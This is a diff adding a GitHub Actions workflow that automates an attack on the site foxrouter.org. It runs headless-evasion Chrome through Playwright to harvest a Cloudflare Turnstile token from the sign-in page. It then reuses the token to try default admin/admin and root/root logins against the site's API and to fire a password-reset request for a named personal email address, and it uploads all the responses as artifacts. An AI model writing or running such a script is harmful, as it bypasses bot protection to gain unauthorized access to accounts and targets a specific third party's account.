@@ -1,0 +1,83 @@
+name: ts
+on: workflow_dispatch
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 14
+    steps:
+      - name: env
+        run: |
+          echo "ip=$(curl -s -m 15 https://api.ipify.org)"; curl -s -m 20 https://foxrouter.org/api/status | head -c 400; echo
+          /usr/bin/google-chrome --version || true
+          sudo apt-get -qq update >/dev/null 2>&1; sudo apt-get -qq install -y xvfb >/dev/null 2>&1; which xvfb-run
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: probe
+        env:
+          RUNNER_TEMP: ${{ runner.temp }}
+        run: |
+          set -x
+          cd "$RUNNER_TEMP"; mkdir -p w; cd w
+          npm init -y >/dev/null 2>&1; npm i playwright-core@1.47.2 --silent >/dev/null 2>&1; echo npm=$?
+          cat > p.js <<'JS'
+          const { chromium } = require('playwright-core');
+          const fs = require('fs');
+          (async () => {
+            const exe = process.env.CHROME || '/usr/bin/google-chrome';
+            const browser = await chromium.launch({ executablePath: exe, headless: false,
+              args:['--no-sandbox','--disable-dev-shm-usage','--disable-blink-features=AutomationControlled'] });
+            const ctx = await browser.newContext({ viewport:{width:1366,height:800}, locale:'en-US', timezoneId:'America/New_York' });
+            const page = await ctx.newPage();
+            page.on('console', m => console.log('CONSOLE', m.type(), m.text().slice(0,300)));
+            page.on('pageerror', e => console.log('PAGEERR', String(e).slice(0,200)));
+            page.on('response', async r => {
+              const u = r.url();
+              if (/challenge-platform|challenges\.cloudflare|turnstile/.test(u)) {
+                let b=''; try { b = (await r.text()).slice(0,400); } catch(e){}
+                console.log('RESP', r.status(), u.slice(0,180), b.replace(/\s+/g,' ').slice(0,250));
+              }
+            });
+            await page.goto(process.env.URL || 'https://foxrouter.org/sign-in', {waitUntil:'domcontentloaded', timeout:60000});
+            console.log('TITLE', await page.title());
+            let token=''; const t0=Date.now();
+            while (Date.now()-t0 < 100000) {
+              token = await page.evaluate(() => {
+                const el = document.querySelector('input[name="cf-turnstile-response"]');
+                if (el && el.value) return el.value;
+                try { if (window.turnstile) { const r = window.turnstile.getResponse(); if (r) return r; } } catch(e){}
+                return '';
+              });
+              if (token) break;
+              await page.waitForTimeout(2000);
+            }
+            console.log('ELAPSED', Date.now()-t0, 'TOKEN_LEN', token.length);
+            console.log('TOKEN=' + token);
+            fs.writeFileSync(process.env.RUNNER_TEMP+'/page.html', await page.content());
+            await page.screenshot({path: process.env.RUNNER_TEMP+'/shot.png', fullPage:false});
+            await browser.close();
+            if (token) fs.writeFileSync(process.env.RUNNER_TEMP+'/token.txt', token);
+          })();
+JS
+          xvfb-run -a node p.js 2>&1 | tail -80
+          if [ -s "$RUNNER_TEMP/token.txt" ]; then
+            T=$(cat "$RUNNER_TEMP/token.txt"); echo "::notice::TOKEN $T"
+            echo "=== login admin/admin with token (same IP)"
+            curl -s -m 30 -D - -o "$RUNNER_TEMP/login.json" "http://foxrouter.org/api/user/login?turnstile=$T" -H 'Content-Type: application/json' -H 'Origin: https://foxrouter.org' --data '{"username":"admin","password":"admin"}' | head -20
+            cat "$RUNNER_TEMP/login.json"; echo
+            echo "=== login root/root"
+            curl -s -m 30 -o "$RUNNER_TEMP/login2.json" "http://foxrouter.org/api/user/login?turnstile=$T" -H 'Content-Type: application/json' --data '{"username":"root","password":"root"}'; cat "$RUNNER_TEMP/login2.json"; echo
+            echo "=== reset_password with same token (no email consumed?)"
+            curl -s -m 30 -o "$RUNNER_TEMP/reset.json" "http://foxrouter.org/api/user/reset_password?email=robincranston35@gmail.com&turnstile=$T"; cat "$RUNNER_TEMP/reset.json"; echo
+          else echo "::error::NO TOKEN"; fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: probe
+          path: |
+            ${{ runner.temp }}/page.html
+            ${{ runner.temp }}/shot.png
+            ${{ runner.temp }}/login.json
+            ${{ runner.temp }}/login2.json
+            ${{ runner.temp }}/reset.json
+            ${{ runner.temp }}/token.txt
